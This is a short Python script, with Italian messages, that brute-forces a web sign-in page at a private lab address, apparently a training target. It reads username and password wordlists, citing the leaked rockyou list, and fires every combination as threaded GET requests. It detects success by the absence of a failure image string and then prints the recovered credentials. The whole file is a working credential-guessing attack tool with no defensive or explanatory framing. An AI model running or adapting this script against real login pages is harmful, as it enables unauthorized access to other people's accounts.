#!/usr/bin/env python3
# Requirements: pip3 install requests
import requests
from concurrent.futures import ThreadPoolExecutor
import threading

TARGET_URL = "http://10.11.249.19/index.php?page=signin&Login=Login"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
THREADS = 5
FAIL_STRING = "WrongAnswer.gif"


"""
Useful wordlists
https://github.com/danielmiessler/SecLists:
- https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
"""
USERLIST = ""
PASSLIST = ""

session = requests.Session()
found_event = threading.Event()

def attempt_login(username, password):

    if found_event.is_set():
        return
    try:
        response = session.get(
            f"{TARGET_URL}&{USERNAME_FIELD}={username}&{PASSWORD_FIELD}={password}",
            timeout=5
        )
        if FAIL_STRING not in response.text:
            print("\nPASSWORD TROVATA!")
            print(f"Username: {username}")
            print(f"Password: {password}")
            found_event.set()
            return True

    except Exception as e:
        print(f"[!] Errore: {e}")

    return False


def worker(combo):
    if found_event.is_set():
        return
    username, password = combo
    attempt_login(username, password)

def load_file(path):
    with open(path, "r", encoding="latin-1") as f:
        return [line.strip() for line in f if line.strip()]

def main():
    usernames = load_file(USERLIST)
    passwords = load_file(PASSLIST)
    combos = []
    for u in usernames:
        for p in passwords:
            combos.append((u, p))
    print(f"Tentativi totali: {len(combos)}")
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for combo in combos:
            if found_event.is_set():
                break
            executor.submit(worker, combo)

if __name__ == "__main__":
    main()